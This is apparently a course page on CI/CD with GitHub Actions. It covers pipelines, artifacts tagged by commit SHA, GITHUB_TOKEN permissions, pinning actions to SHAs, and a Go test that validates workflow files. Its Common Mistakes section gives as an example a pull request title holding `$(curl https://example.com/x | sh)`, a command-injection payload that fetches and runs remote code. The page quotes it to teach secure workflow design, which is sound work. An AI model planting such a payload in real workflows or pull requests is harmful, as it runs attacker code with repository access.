Continuous integration and continuous delivery, CI/CD for short, is the habit, and the machinery, that takes every change from a commit to a running program through the same automated checks. Without it, the checks run only when someone remembers them, and a release depends on whoever builds it on their laptop that day. As a full-stack engineer, you write the pipeline as much as the code it ships: a broken workflow blocks every pull request, and a careless one hands your secrets to strangers.

## What It Is

### Continuous Integration

**Continuous integration**, CI for short, is two habits. Everyone merges small changes into `main` at least once a day, and a machine runs the checks on every change before it merges. The machine is the point. It starts from a clean computer every time, runs every check, and shows the result on the pull request where every reviewer sees it. A check that passes on your laptop and fails in CI points at something your laptop has and the clean machine lacks: a file you forgot to commit, a tool of a different version, an environment variable.

The checks are the ones you already run: the compiler, `go vet`, a linter, the unit tests, the race detector, and the slower tests against a real database or a browser. The CI configuration lists them in a file that lives in the repository, next to the code, and changes in the same pull request as the code. A change that adds a dependency and the check that needs it lands as one reviewed commit.

### Continuous Delivery and Continuous Deployment

**Continuous delivery**, the CD in CI/CD, adds one promise to CI: every commit that passes the checks produces a **release candidate**, an artifact you can deploy at any moment. An **artifact** is the built output of a commit: a binary, a container image, a bundle of web files. **Continuous deployment** goes one step further and deploys every passing commit to production with no person in between.

The difference is one gate, and the choice depends on what stands behind production. Continuous deployment needs checks you trust to stop every bad change, and a rollback that takes seconds. The uptime monitor uses continuous delivery: every merge to `main` builds images, and a deploy is a workflow you start by hand, because a deploy to one small server is an event you want to watch.

### Pipelines, Stages and Artifacts

A **pipeline** is the ordered set of stages a commit passes through: check, build, publish, deploy to staging, deploy to production. Each stage runs only when the stage before it succeeds, and the first failure stops the commit.

Two rules keep a pipeline honest:

- **Build once, deploy that build everywhere.** The image you test in staging is the same image, byte for byte, that reaches production. A pipeline that rebuilds per environment deploys bytes nobody tested: a base image or a dependency can change between the two builds.
- **Name the artifact after the commit.** A tag such as `latest` moves with every build and says nothing about the code inside. A tag made of the commit SHA, named after the Secure Hash Algorithm: the 40-character hash Git computes from a commit, names one exact source tree. It answers which code an image holds, and which image to roll back to.

### GitHub Actions in Brief

GitHub Actions is the CI service built into GitHub. A **workflow** is a file in `.github/workflows/`, written in YAML, the structured text format of most CI and Kubernetes configuration. An **event**, such as `pull_request` or `push`, starts it. A workflow holds **jobs**, and each job runs its **steps** on a **runner**, a fresh virtual machine that GitHub creates for the job and deletes after it. A step runs a shell script with `run:`, or calls an **action** with `uses:`: a packaged step that someone publishes in a Git repository. Jobs run side by side unless `needs:` makes one wait for another. <WeekLink n={14} anchor="the-parts-of-github-actions">The Parts of GitHub Actions in Week 14</WeekLink> covers the rest of the vocabulary, including contexts and expressions.

### The Token, the Pins and the Secrets

A pipeline runs your code, and the code of every dependency you install, with access to your repository. Three settings bound what that code can do.

Every job receives a **`GITHUB_TOKEN`**, a short-lived password for the GitHub API. The `permissions:` key sets its scopes. As soon as a workflow names one scope, every scope it does not name becomes `none`. Without a `permissions:` key, the token gets the default from the repository or organization settings: read and write in many created before February 2023, read-only in those created since. Write `permissions: contents: read` at the top of every workflow, and grant more to the one job that needs it.

An action reference such as `actions/checkout@v7` names a Git tag, and the owner of a repository can move a tag to new code. A full commit SHA cannot move. Pin every action to a SHA, with the release in a comment, and let Dependabot, the GitHub bot that proposes dependency updates, raise the pins. <WeekLink n={14} anchor="pin-actions-to-a-commit">Pin Actions to a Commit in Week 14</WeekLink> tells the story of the March 2025 attack that moved every tag of one popular action.

**Secrets**, such as a kubeconfig, the file that holds the address of a cluster and the credentials for it, live in the repository settings. GitHub masks their values in logs. A pull request from a **fork**, a copy of the repository in another account, runs without them and with a read-only token.

### What Makes a Pipeline Good

- **Fast.** Keep a pull request run under 10 minutes. Past that, people switch to other work and meet the red result an hour later.
- **Deterministic.** The same commit gives the same result. A **flaky** test, one that passes and fails on the same code, trains everyone to press rerun and ignore red.
- **The same commands as your laptop.** `make ci` on your laptop and the CI workflow run the same checks. A red pull request then surprises no one.
- **Required.** A rule on `main` refuses a merge until the checks pass. People skip a check that is only advice on the day it matters.

- `concurrency`: one group per pull request, from `github.ref`. When you push twice in a minute, `cancel-in-progress: true` cancels the run of the first push, which no one reads.

Each `uses:` line names a full commit SHA, with the release in the comment.

The build job sits under `jobs:` after `test`:

`needs: test` makes the build wait for the tests, and skips it when they fail. `CGO_ENABLED=0` builds static binaries, as the <TrackLink slug="containers">Containers track</TrackLink> explains, and `-o bin/` with `./cmd/...` writes one binary per program into `bin/`. `actions/upload-artifact` stores the folder with the run for seven days, where a reviewer can download what the pull request builds.

GitHub Actions does not run on your laptop, and a typo in a workflow shows up only after a push. The test in `ci_test.go` reads the file as YAML with `go.yaml.in/yaml/v3` and checks the rules this page names:

<CodeFrom file="go/tracks/cicd/ci_test.go" region="checks" lang="go" title="ci_test.go" />

- `pins`: walks the YAML tree and checks every `uses:` value against `pinned`, which accepts only a full 40-character SHA. It rejects a tag such as `@v7`, a branch such as `@main`, and a short SHA: only the full 40 characters name one commit for certain. The comment on the same line must name the release, such as `# v7.0.1`, and the YAML parser keeps that comment on the value it belongs to.
- `readOnly`: accepts `read-all`, or walks the `permissions:` mapping and reports any scope other than `read` or `none`. A missing block fails at the workflow level, because the token then falls back to the repository default.
- `problems`: collects every broken rule, including a missing `needs: test` and a test job without `go test -race ./...`.

<CodeFrom file="go/tracks/cicd/ci_test.go" region="test" lang="go" title="ci_test.go" />

A check that passes everything proves nothing. `TestChecksCatchMistakes` in the same file breaks a copy of `ci.yml` once per rule, such as `contents: write` or `@main`, and expects exactly that rule to fail. Run the tests from `examples/go` with `go test -race ./tracks/cicd/`. `actionlint`, which Week 14 installs, checks the expressions and `run:` scripts that the test leaves alone.

## Common Mistakes

- **No `permissions:` block.** In an older repository, every job then holds a token that can push commits and packages, and one hostile test dependency uses it. Write `contents: read` at the top of every workflow.
- **An action pinned to a branch or a tag.** `@main` and `@v7` run whatever the action owner, or whoever steals their credentials, points them at next. Pin a full SHA with the release in a comment, and read the SHA from the action repository with `git ls-remote`, never from a blog post or a chatbot answer.
- **An expression inside a `run:` script.** GitHub pastes `${{ github.event.pull_request.title }}` into the script text before bash reads it, and a pull request titled `$(curl https://example.com/x | sh)` runs as code. Pass the value through `env:` and quote the variable in the script.
- **`pull_request_target` with a checkout of the pull request code.** That event runs with your secrets and a write token, for pull requests from forks too. A workflow that checks out and builds the fork code there hands both to a stranger. Use `pull_request` for anything that runs the code under review.
- **A rebuild per environment.** Staging tests one build and production runs another, made minutes later from a base image that moved in between. Build once, tag with the SHA, and promote that tag.
- **A rerun that hides a flaky test.** The run turns green and the bug stays. Write down the name of every test that passes on a rerun, and fix it in the same week.
- **CI that runs different commands from your laptop.** A check that exists only in the workflow fails for the first time on a pull request, where it costs a review round. Keep one entry point, such as `make ci`, and call it from both places, or test that they match, as Week 14 does.

## Going Deeper

- **Reusable workflows and composite actions:** one definition of the checks, called from every repository you own, instead of copies that drift apart.
- **OpenID Connect for deploys:** GitHub issues the job a signed identity token, and a cloud provider trades it for short-lived credentials, which removes the long-lived cloud secret from the repository.
- **Build provenance and SLSA, Supply-chain Levels for Software Artifacts:** a signed statement of which workflow built which artifact from which commit, which a cluster can check before it runs an image.
- **Merge queues:** GitHub tests each pull request on top of the ones queued before it, which catches two changes that pass alone and break together.
- **GitOps with Argo CD or Flux:** the cluster pulls its desired state from a Git repository, and a deploy becomes a commit, reviewed like any other.
- **Progressive delivery:** canary releases and feature flags expose a change to a small share of traffic first, which turns a bad deploy into a small incident.
- **DORA metrics:** DevOps Research and Assessment, DORA, a research program on software delivery, measures how well a team ships with deployment frequency, lead time for changes, change failure rate and recovery time.
